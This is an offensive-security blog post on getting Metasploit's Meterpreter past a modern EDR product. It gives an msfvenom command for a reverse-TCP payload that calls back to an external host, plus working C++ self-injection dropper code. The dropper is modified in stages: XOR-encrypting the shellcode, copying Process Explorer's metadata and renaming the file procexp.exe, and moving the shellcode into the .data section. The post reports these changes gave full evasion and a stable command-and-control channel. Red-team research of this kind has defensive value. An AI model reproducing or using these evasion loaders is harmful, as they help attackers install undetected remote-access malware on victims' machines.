# https://redops.at/en/blog/meterpreter-vs-modern-edrs-in-2023

[Previous](https://redops.at/en/knowledge-base)

# Meterpreter vs Modern EDR(s)

**tl;dr** Endpoint security continues to be a hot topic, with almost every organisation deploying various products such as antivirus (AV), endpoint protection (EPP) and endpoint detection and response (EDR) systems to prevent or monitor the execution of malware. In recent years, a real game of cat and mouse has developed between the red teamers (attackers) and the blue teamers (defenders). Malicious attackers and Red Teamer alike keep finding new ways to execute malware on the target computer unnoticed, but it usually does not take long for the defenders or product manufacturers to improve. Meanwhile, from an attacker's point of view, there are a number of different techniques that can be used under Windows OS to enhance their own malware or increase its legitimacy. Depending on the technique used, the implementation can sometimes be complex, e.g. direct syscalls, indirect syscalls, hardware breakpoints, etc.

However, in this blog post I would like to show that even today (March 2023) very simple modifications to a Meterpreter shellcode dropper can be sufficient to bypass modern EDRs. To do this, we will step through three modifications to a Meterpreter reference dropper and record the results in the context of EDR evasion. The three modifications include simply encrypting the Meterpreter shellcode with the XOR algorithm, adding legitimate metadata using a manifest file, and moving the Meterpreter shellcode from the .text section to the .data section.

- [EDR Evasion](https://redops.at/en/knowledge-base?filter=EDR%20Evasion)
- [Malware Development](https://redops.at/en/knowledge-base?filter=Malware%20Development)

![I Stock 1248685118](https://redops.at/assets/images/iStock-1248685118.jpg)

### Disclaimer

The content and all code examples in this article are for research purposes only and must not be used in an unethical context!

### Introduction

When I talk about EDRs in this article, I mean a combination of endpoint protection (EPP) and endpoint detection and response (EDR). I also want to define the term "evasion" in the context of EDRs and malware. When I talk about the fact that it is or has been possible to bypass the EDR, the term "bypass" refers to the fact that no prevention and no detection has taken place on the part of the EDR. However, the EDR continues to collect telemetry data at the endpoint that can be used for active threat hunting.

In the meantime, from the point of view of the attackers (Red Team), there is a whole range of different techniques, such as direct system calls, indirect system calls, API unhooking, etc., which can help us as Red Teamers to evade detection by Endpoint Protection (EPP) and Endpoint Detection and Response (EDR) systems. However, even if you add various evasion features to your malware, e.g. shellcode dropper, the command and control framework (C2) used or the respective shellcode often seems to be a certain limitation. With modern Red Team C2s such as Nighthawk, Cobal Strike, Brute Ratel, etc., this seems to be less of a problem, as the stager's shellcode or payload is already equipped with very useful evasion features such as indirect syscalls, hardware breakpoints, etc. by default.

The situation is somewhat different with freely available frameworks such as the Metasploit Framework (MSF), which can sometimes make it very difficult to bypass modern EDRs in the context of command and control connections. Whether and at what stage Meterpreter shellcode, or the execution of [Meterpreter shellcode](https://github.com/rapid7/metasploit-framework/blob/0cbfd483ae9291583f8f3bdabe3cf168c5b78991/lib/msf/core/payload/windows/reverse_tcp.rb#:~:text=NULL%2C%20dwLength%2C%20MEM_COMMIT%2C-,PAGE_EXECUTE_READWRITE,-)%3B), is detected by EDRs depends on various factors such as signatures in the shellcode. Similarly, how the executed shellcode behaves in memory can be important for detection by EDRs. For example, Metasploit or Meterpreter shellcode in memory is detected by EDRs based on certain patterns.

For example, if you look at legitimate areas of memory with Process Hacker, you will see that they are of the type `Image` and also point to the associated image. If you look at a meterpreter payload in memory, you will notice that there are also some memory regions of type `private` that do not refer to an image. For example, the `4kB` meterpreter stager can be identified. These types of memory regions are called `unbacked executable sections` and are usually classified as malicious by EDRs.

Similarly, from an EDR's point of view, it is rather unusual for a thread to have, for example, memory areas in the .text (code) section marked as read (R), write (W) and executable (X) at the same time. By default, the .text section is a read-only section in the PE structure. When using a Meterpreter payload, this does not apply in its entirety, because by using the Windows API VirtualAlloc, certain areas are additionally marked as write (W) and executable (X), or the affected memory area is marked as `RWX` in its entirety (`PAGE_EXECUTE_READWRITE`).

![Msf stager pages](https://redops.at/assets/images/msf_stager_pages.png)

A simple self-injection dropper (reference dropper) in C++ is used as a base or reference, which is then modified step by step. After each modification of the reference dropper, it is determined whether the modification provides an advantage in bypassing the tested EDR. The following three modifications will be made to the reference dropper during the course of this article:

1. **Shellcode encryption:** XOR encryption of the reference dropper's meterpreter shellcode

2. **Metadata:** Add legitimate metadata to the XOR shellcode dropper using a manifest file

3. **PE structure:** Move the metepreter shellcode from the .text section to the .data section in the PE structure


We also want to measure the entropy value of our dropper after each change. Entropy is a measure of the randomness in a data set. In the context of computer science and cybersecurity, [Shannon entropy](https://en.wikipedia.org/wiki/Entropy_(information_theory)) is most commonly used. In general, a normal file has an ordered structure, low entropy and high density. The structure of abnormal files (malware) tends to have high entropy and low density. The entropy value can be or is used by EDRs to finally classify a suspicious file as legitimate or malicious. Files with an entropy between 4.8 and 7.2 are more likely to be classified as legitimate by EDRs, while files with an entropy above 7.2 are more likely to be classified as malicious.

To learn more about entropy in the context of malware, see the following [article](https://practicalsecurityanalytics.com/file-entropy/). The free version of [pestudio](https://www.winitor.com/download2) was used to measure entropy.

Out of respect for the EDR vendor, the name of the EDR is not mentioned. However, readers are invited to perform the test with their own EDR.

### Meterpreter Reference Dropper

First we need to create our C++ reference dropper. So we start by creating a staged meterpreter TCP payload with msfvenom. The -f parameter indicates that we want our payload output in typical shellcode hex format.

Code kopieren


```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=External_IPv4_Redirector LPORT=80 -f c
```

![Meterpreter tcp payload](https://redops.at/assets/images/meterpreter_tcp_payload.png)

The generated meterpreter shellcode in hex format can then be inserted into the C++ POC and compiled.

Code kopieren


```cpp
#include <stdio.h>
#include <windows.h>

int main() {

	// Replace your MSF-Shellcode
	unsigned char code[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\...";

	// Allocate memory for MSF-Shellcode
	void* exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Copy MSF-Shellcode into the allocated memory
	memcpy(exec, code, sizeof code);

	// Execute MSF-Shellcode in memory
	((void(*)())exec)();
	return 0;

}
```

#### Technical Explanation Reference Dropper

- We define the variable `code` within the main function, which stores our meterpreter shellcode. Since the variable is defined within the main function, it is declared as a local variable, with the shellcode stored in the `.text` (code) section, or in our case in .rdata, since the meterpreter stager is larger than `255 bytes` (thanks to **Paranoid Ninja** and **den18** for helping me out in that topic!).


- We define a pointer of type `void*` with the variable `exec`, which points to the Windows API `VirtualAlloc` and returns the start address of the allocated memory block.


- The Windows API `VirtualAlloc` is used to allocate memory, a brief explanation of the parameters used in the function.




  - The first argument, `0`, is a pointer to the start address of the memory block. In this case, we ask `VirtualAlloc` to determine the start address by passing a null pointer.

  - The second argument, `sizeof code`, specifies the size of the block of memory to allocate. As `code` is an array of bytes, the size of the array is calculated using the sizeof operator.

  - The third argument, `MEM_COMMIT`, instructs `VirtualAlloc` to allocate memory pages to the block, which means that physical memory is allocated. This ensures that the memory is available for use.

  - The fourth argument, `PAGE_EXECUTE_READWRITE`, defines the memory protection for the allocated block. In this case the definition is read (R), write (W) and executable (X).

- The `memcpy` function is called to copy the meterpreter shellcode from the `code` array into the allocated memory.




  - The first argument, `exec`, is a pointer to the target memory block.

  - The second argument, `code`, is a pointer to the source memory block.

  - The third argument, `sizeof code`, specifies the number of bytes to copy.
- The shell code is executed by calling the function pointer `((void(*)())exec)()`. With this syntax, the `exec` pointer is converted to a function pointer, then the function is called, and then the meterpreter shellcode is executed.

#### **Observations**

After copying the reference Meterpreter shellcode dropper to the hard drive of the computer with EDR installed, the .exe was statically detected by the tested **EDR** as expected, classified as malicious with a **high priority** and quarantined. This result was to be expected as the standard Meterpreter shellcode has unique static signatures and as such should be detected as malicious by any modern EDR and prevented from running.

![Flow chart msf reference dropper](https://redops.at/assets/images/blog/Flow_chart_msf_reference_dropper.png)

As mentioned at the beginning, we always want to keep an eye on the entropy of our shellcode dropper and use the free version of PE-Monitor to do this. In this case, the **entropy** of the compiled reference dropper is **4.901**.

![EDR High Alert entropy](https://redops.at/assets/images/EDR_High_Alert_entropy.png)

### Meterpreter Shellcode XOR-Encryption

In this section we start with the **first modification** of our reference dropper. To prevent static detection of the meterpreter shellcode, we can try encrypting the shellcode using the [XOR algorithm](https://en.wikipedia.org/wiki/XOR_cipher). In general, encrypting the shellcode increases the entropy of the dropper, but since we want to avoid increasing it too much, we deliberately chose not to encrypt it with a stronger algorithm like AES in this experiment.

The following C++ code can be used to encrypt the meterpreter shellcode. It is not the cleverest or most convenient, but it does the job and produces an XOR-encrypted Meterpreter TCP shellcode as output.

Code kopieren


```cpp
#include <stdio.h>
#include <windows.h>

int main()
{
    unsigned char code[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\...";

	char key = 'ABCD';
	int i = 0;
	for (i; i < sizeof(code); i++)
	{
		printf("\\x%02x", code[i] ^ key);
	}
```

![Xor encrypted meterpreter shellcode](https://redops.at/assets/images/xor_encrypted_meterpreter_shellcode.png)

To be able to use the encrypted shellcode, we extend our reference dropper with the XOR decryption part. The XOR-encrypted shellcode and the key used are then inserted into the VS project.

Code kopieren


```cpp
#include <stdio.h>
#include <windows.h>

int main() {

	// Replace your XOR encrypted MSF-Shellcode
	unsigned char code[] = "\xa6\x12\xd9\xbe\xaa\xb2\x96\...";

	// Decrypt XOR encrpyted MSF-Shellcode
	char key = 'ABCD';
	int i = 0;
	for (i; i < sizeof(code) - 1; i++)
	{
		code[i] = code[i] ^ key;
	}


	// Allocate memory for the decrypted MSF-Shellcode
	void* exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Copy the MSF-Shellcode into the allocated memory
	memcpy(exec, code, sizeof code);

	// Execute the decrypted MSF-Shellcode in memory
	((void(*)())exec)();
	return 0;

}
```

#### **Observations**

Various observations could be made with the EDR tested. Interestingly, the XOR encryption of the Meterpreter shellcode did not always seem to be sufficient to bypass the static part of the EDR. Although the configuration of the EDR was not changed between attempts, our dropper (.exe) was partially intercepted by the static detection of the EDR and moved to quarantine.

In some attempts, encrypting the Meterpreter shellcode with the XOR algorithm appeared to be sufficient to bypass the static detection of the EDR. In these cases (best case) our dropper was able to execute, but was detected by the dynamic analysis of the EDR and an alert was raised with a **medium priority**. In some cases (worst case) the Meterpreter dropper was still statically detected by the EDR after execution and classified with a high priority alert. Overall, however, a first small partial success can be reported as the EDR was able to reduce the priority of the alert from **High to Medium**.

![Flow chart msf first modification](https://redops.at/assets/images/blog/Flow_chart_msf_first_modification.png)

After our first modification of the reference dropper, we want to measure the entropy of our compiled .exe again with pestudio. As expected, the entropy increases slightly from 4.901 to **5.033** due to the encryption of the Meterpreter shellcode.

![EDR XOR Medium Alert entropy](https://redops.at/assets/images/EDR_XOR_Medium_Alert_entropy.png)

### Metadata-Manifest

In the previous step, we had partial success with our EDR evasion experiment. However, in some cases our Meterpreter shellcode dropper was statically detected by the EDR and quarantined despite XOR encryption.

The **second modification** to the Meterpreter reference dropper is to investigate the effect of adding **legitimate metadata** in the form of a **manifest file**. Simply put, with this modification we want our shellcode dropper to gain some legitimacy from an EDR perspective. For this experiment, the code from the previous step (XOR encryption) is not changed, we simply add an empty manifest file to the Visual Studio project, which is then filled with metadata. The manifest file can be added to the Visual Studio project as a resource (version). In this case we use the metadata from Process Explorer for our manifest (sorry Mark for using the metadata from Process Explorer).

![VS manifest ressource](https://redops.at/assets/images/VS_manifest_ressource.png)

We can then recompile our Meterpreter shellcode dropper and see that our .exe now has the metadata of the original procexp.exe. To make our dropper look even more legitimate, we change the name of the dropper to **procexp.exe**.

![Manifest procexp](https://redops.at/assets/images/manifest_procexp.png)

#### **Observations**

Again, although the configuration of the EDR was not changed between trials, different observations could be made in several trials after the second modification.

In general, we can say that the addition of legitimate metadata has a positive effect on our shellcode dropper (from the attacker's point of view), but in detail there were clear differences. We recall that after the first modification, where we encrypted the shellcode using the XOR algorithm, there were still attempts where the meterpreter shellcode was statically captured by the EDR. After adding the legitimate metadata to our dropper, we found that the metadata had a positive effect on static EDR evasion. In other words, although the dropper was statically captured by the XOR shellcode before, after adding the metadata, the dropper was no longer statically captured by the EDR. This is another small partial success, as the problem of static EDR invasion has been solved for now.

After running our dropper (procexp.exe), we also observed a different behaviour of the EDR. In some experiments (best case) the metadata also seemed to have a positive influence on the dynamic EDR invasion. That means, the two modifications, XOR encryption and the addition of a legitimate manifest file, were enough to bypass the well-known EDR with a meterpreter TCP shellcode. In further attempts (worst case) - the EDR configuration was again left unchanged - the dropper was able to execute, but was detected by the EDR with a **low priority**. Even though the dropper was still partially detected by the EDR after execution through dynamic detection mechanisms, we can claim another small partial success as we were able to lower the priority of the alert again, this time from **medium to low**.

![Flow chart msf second modification](https://redops.at/assets/images/Flow_chart_msf_second_modification.png)

It was also observed that adding legitimate metadata in the form of a manifest file reduced the entropy from 5.033 to **4.922**.

![EDR XOR Manifest Low Alert entropy](https://redops.at/assets/images/EDR_XOR_Manifest_Low_Alert_entropy.png)

### From .text to .data

In the previous step, we achieved further partial successes. In the best case, two modifications (XOR and Manifest) to our Meterpreter reference dropper were enough to bypass the tested EDR and open a stable Command and Control (C2) channel. In the worst case, our dropper was still detected and blocked by the EDR after execution, but even in this case we were able to achieve another partial success by reducing the EDR alarm from medium to low.

The **third and final modification** to our dropper is to investigate the effect on EDR bypassing of not defining the meterpreter shellcode as a local variable inside the Main function as before, and thus storing it in the `.text` (code) section of the PE structure. Instead, we define the shellcode variable `code` outside the Main function and thus as a global variable, with the shellcode stored in the .data section of the PE structure.

Code kopieren


```cpp
#include <stdio.h>
#include <windows.h>

    // Replace your XOR encrypted MSF-Shellcode
	unsigned char code[] = "\xa6\x12\xd9\xbe\xaa\xb2\x96\...";

int main() {

	// Decrypt XOR encrpyted MSF-Shellcode
	char key = 'ABCD';
	int i = 0;
	for (i; i < sizeof(code) - 1; i++)
	{
		code[i] = code[i] ^ key;
	}


	// Allocate memory for the decrypted MSF-Shellcode
	void* exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Copy the MSF-Shellcode into the allocated memory
	memcpy(exec, code, sizeof code);

	// Execute the decrypted MSF-Shellcode in memory
	((void(*)())exec)();
	return 0;

}
```

Once the third modification has been successfully made, i.e. the variable `code` has been defined as a global variable, CFF Explorer can be used to check whether the XORed Meterpreter shellcode is actually in the `.data`section.

![CFF shellcode in data](https://redops.at/assets/images/CFF_shellcode_in_data.png)

#### **Observations**

After the third modification of the Meterpreter shellcode dropper, the same behaviour of the EDR could be observed in several attempts. The EDR did not detect our Meterpreter shellcode dropper statically after copying the dropper to disk, nor did it detect the dropper as malicious after execution. Even after repeated execution at different time intervals, the Meterpreter dropper (XOR, manifest and .data) was not detected by the EDR and a stable C2 channel could be established.

Whether and why moving the Meterpreter shellcode from the .text section (code section) or .rdata section to the .data section has a positive effect on the evasion capabilities of our shellcode dropper is currently not entirely clear and only the following assumptions can be made without claiming to be correct or complete.

- The EDR solution uses memory scanning techniques that are specifically designed to detect shellcode in the .text section, but not in the .data section. For example, the EDR may use signature-based detection techniques that are effective at detecting common shellcode patterns in the .text section, but may not be as effective at detecting the same shellcode in the .data section.

- The .text section is normally a read-only memory area, while the .data section is read-write. If the EDR solution does not monitor write access to the .data section, it may not detect malicious shellcode written to this memory area.


![Flow chart msf third modification](https://redops.at/assets/images/blog/Flow_chart_msf_third_modification.png)

We also want to capture the entropy of our triple-modified shellcode dropper. Interestingly, moving the Meterpreter shellcode to the .data section caused the entropy to drop from 4.922 to **4.783**.

![Shellcode in data section entropy](https://redops.at/assets/images/shellcode_in_data_section_entropy.png)

### Summary

After the **reference dropper** was copied unchanged to the hard drive of the computer with the EDR installed, detection was performed by the EDR based on known signatures in the Meterpreter shellcode. The dropper (.exe) was classified as **high priority** malicious and moved to quarantine.

The **first modification** was a simple XOR encryption of the Meterpreter shellcode and the POC of the reference dropper was extended to include the XOR decryption part. Although no further modifications were made to the dropper and the configuration of the EDR was not changed between experiments, we obtained different results. In some results, the XOR encryption of the well-known meterpreter shellcode was not sufficient and was still statically detected by the EDR and given a high priority. In other tests with the same EDR, the dropper was not statically detected. The dropper was able to run on the target, but was then dynamically detected by the EDR. However, a first partial success was recorded, as the EDR changed the priority of the alert from **high to medium**.

The **second modification** was to add legitimate Process Explorer metadata to the XOR dropper in the form of a manifest file. Again, the EDR configuration was not changed between experiments, but again, different results were obtained. In the worst case, the metadata added to our dropper "only" had a positive effect on bypassing the static detection of the EDR, and the dropper was still detected by the EDR after execution. At best, the metadata in the form of the manifest file also seemed to have a positive effect on bypassing the EDR's dynamic detection. In other words, the dropper's execution was no longer blocked by the EDR, and a stable Meterpreter command and control channel could be opened. However, even though the addition of the procexp.exe metadata only had a positive effect on the static EDR invasion as described above, there was another partial success in that the EDR no longer prioritised the dropper with medium, but with **low**.

The **third and final modification** to our Meterpreter shellcode dropper was to move the shellcode from the .text section to the .data section by declaring the shellcode variable `code` in the C++ POC as a global variable instead of a local one. Here we found that the third change was sufficient to " **permanently**" bypass the EDR, despite simple self-injection and meterpreter shellcode in our experiments.

It was also interesting to observe that adding legitimate metadata (manifest) and also moving the Meterpreter shellcode to the .data section in the PE structure had a reducing effect on the entropy of the Meterpreter dropper.

- Reference Dropper with standard Meterpreter TCP shellcode -> **4.901**
- Dropper after first modification (XOR) -> **5.033**
- Dropper after second modification (XOR and manifest) -> **4.922**
- Dropper after third modification (XOR, manifest and .data) -> **4.783**

Why it is possible today (March 2023) to "permanently" bypass the well-known EDR with a simple meterpreter TCP payload cannot be clearly explained. My guess is that the combination of the three modifications helps the dropper to gain legitimacy and thus no longer be perceived as harmful by the EDR as a whole. In my opinion, the entropy of the dropper also plays a crucial role. In the case of the EDRs tested, I had the impression that if the entropy of the malware is between 4.5 and 4.8, the probability of it not being detected as harmful by the EDR is significantly higher.

But what can we learn from this test? Although I was a little surprised myself in the case of the EDR tested, I am not interested in pointing the finger at a product. Much more important to me is the realisation that, from an attacker's point of view, bypassing an EDR does not always require complex evasion techniques. A few simple modifications to a self-injection dropper are enough to bypass even good EDRs. The experiment also showed me that the **shellcode** of a C2 framework is **not necessarily** a **limitation**. In the case of Meterpreter, there are probably many signatures used to detect EDRs, but with a few simple modifications it is still possible to create a usable Meterpreter dropper.

Happy Hacking!

Daniel Feichter [@VirtualAllocEx](https://twitter.com/VirtualAllocEx)

### References

- [https://csandker.io/2019/07/24...](https://csandker.io/2019/07/24/ABeginnersGuideToWindowsShellcodeExecutionTechniques.html)
- [https://www.ired.team/offensiv...](https://www.ired.team/offensive-security/code-injection-process-injection/process-injection)
- [https://learn.microsoft.com/en...](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [https://learn.microsoft.com/en...](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
- [https://en.wikipedia.org/wiki/...](https://en.wikipedia.org/wiki/XOR_cipher)
- [https://practicalsecurityanaly...](https://practicalsecurityanalytics.com/file-entropy/)
- [https://github.com/rapid7/meta...](https://github.com/rapid7/metasploit-framework/blob/0cbfd483ae9291583f8f3bdabe3cf168c5b78991/lib/msf/core/payload/windows/reverse_tcp.rb)
- [https://www.elastic.co/securit...](https://www.elastic.co/security-labs/hunting-memory)
- [https://en.wikipedia.org/wiki/...](https://en.wikipedia.org/wiki/Entropy_)(information\_theory)
- [https://www.socinvestigation.c...](https://www.socinvestigation.com/densityscout-entropy-analyzer-for-threat-hunting-and-incident-response/)

Last updated

17.03.24 19:53:36

17.03.24


Daniel Feichter


Posts about related Topics


- [Workshop\\
\\
\\
2026-01-23\\
\\
\\
Demo Material – Endpoint Security Insights Workshop\\
\\
\\
Daniel Feichter](https://redops.at/en/blog/demo-material-endpoint-security-insights-workshop)
- [Workshop\\
\\
\\
2026-01-02\\
\\
\\
Training/Workshop - Endpoint Security Insights: Shellcode Loaders & Evasion Fundamentals\\
\\
\\
Daniel Feichter](https://redops.at/en/blog/training-endpoint-security-insights-shellcode-loaders-and-evasion-fundamentals)
- [Windows Internals\\
\\
\\
2025-10-15\\
\\
\\
The Emulator's Gambit: Executing Code from Non-Executable Memory\\
\\
\\
Daniel Feichter](https://redops.at/en/blog/the-emulators-gambit-executing-code-from-non-executable-memory)
- [Workshop\\
\\
\\
2025-09-10\\
\\
\\
Endpoint Security Insights Workshop: Option B - Self-Paced\\
\\
\\
Daniel Feichter](https://redops.at/en/blog/endpoint-security-insights-workshop-option-b-self-paced)

Back to top